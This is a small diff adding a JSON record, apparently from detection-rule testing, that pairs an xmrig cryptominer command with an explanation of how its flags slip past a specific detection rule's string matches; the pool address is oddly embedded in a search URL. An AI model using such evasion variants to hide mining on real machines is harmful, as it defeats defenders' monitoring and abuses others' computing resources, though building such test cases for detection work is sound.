@@ -1,0 +1,6 @@
+[
+  {
+    "output": "xmrig.exe -o stratum+ssl://https://www.google.com/search?q=xmr-pool.example.com:443 -u wallet_address --donate-level=1 --algo rx/0",
+    "explanation": "Bypasses the selection strings by using 'stratum+ssl://' (the rule only checks for tcp and udp), changing the donate level to 1 (the rule strictly matches '--donate-level=0'), and using '--algo rx/0' (the rule strictly matches '--algo=rx/0 ' with an equal sign and trailing space)."
+  }
+]
